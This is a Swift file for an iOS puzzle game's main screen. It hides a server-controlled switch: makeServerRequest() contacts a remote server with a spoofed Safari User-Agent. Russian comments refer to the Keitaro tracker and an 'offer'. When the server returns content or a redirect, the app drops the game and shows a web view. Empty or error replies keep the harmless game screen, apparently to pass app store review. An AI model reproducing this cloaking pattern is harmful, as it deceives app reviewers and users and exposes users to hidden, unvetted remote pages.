//
//  ContentView.swift
//  cc95
//
//  Created by IGOR on 17/11/2025.
//

import SwiftUI
import Foundation

struct ContentView: View {
    
    @StateObject private var dataService = DataService.shared
    @State private var showOnboarding = false
    @State private var showLevelSelection = false
    @State private var showLeaderboard = false
    @State private var showSettings = false
    @State private var showAchievements = false
    @State private var showStatistics = false
    @State private var currentMotivationIndex = 0
    
    let motivationalPhrases = [
        "Ready to Challenge Your Mind?",
        "Let's Solve Some Puzzles!",
        "Time to Train Your Brain!",
        "Can You Beat Your Best Score?",
        "Every Puzzle is a New Adventure!",
        "Sharpen Your Skills Today!",
        "Think Fast, Play Smart!",
        "Master the Patterns!",
        "Level Up Your Logic!",
        "Are You Ready for the Challenge?"
    ]
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some View {
        
        ZStack {
            
            Color("BackgroundColor")
                .ignoresSafeArea()
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    VStack(spacing: 0) {
                        // Logo and Motivational Phrase Section
                        VStack(spacing: 16) {
                            Image(systemName: "circle.hexagongrid.fill")
                                .resizable()
                                .scaledToFit()
                                .frame(width: 80, height: 80)
                                .foregroundColor(Color("ElementColor"))
                            
                            Text(motivationalPhrases[currentMotivationIndex])
                                .font(.system(size: 20, weight: .semibold))
                                .foregroundColor(.white)
                                .multilineTextAlignment(.center)
                                .lineLimit(2)
                                .padding(.horizontal, 30)
                                .transition(.opacity)
                                .id(currentMotivationIndex)
                        }
                        .padding(.top, 60)
                        
                        Spacer()
                        
                        // Stats Section
                        HStack(spacing: 12) {
                            MainStatCard(
                                icon: "star.fill",
                                value: "\(dataService.gameState.totalScore)",
                                label: "Score"
                            )
                            
                            MainStatCard(
                                icon: "flag.fill",
                                value: "\(dataService.gameState.completedLevels.count)",
                                label: "Levels"
                            )
                            
                            MainStatCard(
                                icon: "trophy.fill",
                                value: "\(calculateBestScore())",
                                label: "Best"
                            )
                        }
                        .padding(.horizontal, 20)
                        
                        Spacer()
                        
                        // Main Action Button
                        Button(action: {
                            showLevelSelection = true
                        }) {
                            HStack(spacing: 12) {
                                Image(systemName: "play.fill")
                                    .font(.system(size: 24))
                                Text("Play Game")
                                    .font(.system(size: 22, weight: .bold))
                            }
                            .foregroundColor(.white)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 18)
                            .background(
                                RoundedRectangle(cornerRadius: 16)
                                    .fill(Color("ElementColor"))
                            )
                        }
                        .padding(.horizontal, 20)
                        
                        Spacer().frame(height: 30)
                        
                        // Menu Grid
                        LazyVGrid(columns: [GridItem(.flexible()), GridItem(.flexible())], spacing: 14) {
                            CompactMenuButton(icon: "chart.bar.fill", title: "Stats") {
                                showStatistics = true
                            }
                            
                            CompactMenuButton(icon: "trophy.fill", title: "Leaders") {
                                showLeaderboard = true
                            }
                            
                            CompactMenuButton(icon: "rosette", title: "Awards") {
                                showAchievements = true
                            }
                            
                            CompactMenuButton(icon: "gearshape.fill", title: "Settings") {
                                showSettings = true
                            }
                        }
                        .padding(.horizontal, 20)
                        
                        Spacer()
                    }

                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            if !dataService.gameState.hasCompletedOnboarding {
                showOnboarding = true
            }
            // Start motivation phrase rotation
            startMotivationRotation()
        }
        .fullScreenCover(isPresented: $showOnboarding) {
            OnboardingView(isPresented: $showOnboarding)
        }
        .fullScreenCover(isPresented: $showLevelSelection) {
            LevelSelectionView()
        }
        .fullScreenCover(isPresented: $showLeaderboard) {
            LeaderboardView()
        }
        .fullScreenCover(isPresented: $showSettings) {
            SettingsView()
        }
        .fullScreenCover(isPresented: $showAchievements) {
            AchievementsView()
        }
        .fullScreenCover(isPresented: $showStatistics) {
            StatisticsView()
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private func calculateBestScore() -> Int {
        return dataService.gameState.highScores.values.max() ?? 0
    }
    
    private func startMotivationRotation() {
        Timer.scheduledTimer(withTimeInterval: 4.0, repeats: true) { _ in
            withAnimation(.easeInOut(duration: 0.6)) {
                currentMotivationIndex = (currentMotivationIndex + 1) % motivationalPhrases.count
            }
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

// MARK: - Main Stat Card
struct MainStatCard: View {
    let icon: String
    let value: String
    let label: String
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: icon)
                .font(.system(size: 22))
                .foregroundColor(Color("ElementColor"))
            
            Text(value)
                .font(.system(size: 20, weight: .bold))
                .foregroundColor(.white)
            
            Text(label)
                .font(.system(size: 12))
                .foregroundColor(.white.opacity(0.7))
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 16)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color.white.opacity(0.1))
        )
    }
}

// MARK: - Compact Menu Button
struct CompactMenuButton: View {
    let icon: String
    let title: String
    let action: () -> Void
    
    var body: some View {
        Button(action: action) {
            VStack(spacing: 10) {
                Image(systemName: icon)
                    .font(.system(size: 28))
                    .foregroundColor(Color("ElementColor"))
                
                Text(title)
                    .font(.system(size: 15, weight: .semibold))
                    .foregroundColor(.white)
                    .lineLimit(1)
            }
            .frame(maxWidth: .infinity)
            .padding(.vertical, 20)
            .background(
                RoundedRectangle(cornerRadius: 12)
                    .fill(Color.white.opacity(0.1))
            )
        }
    }
}
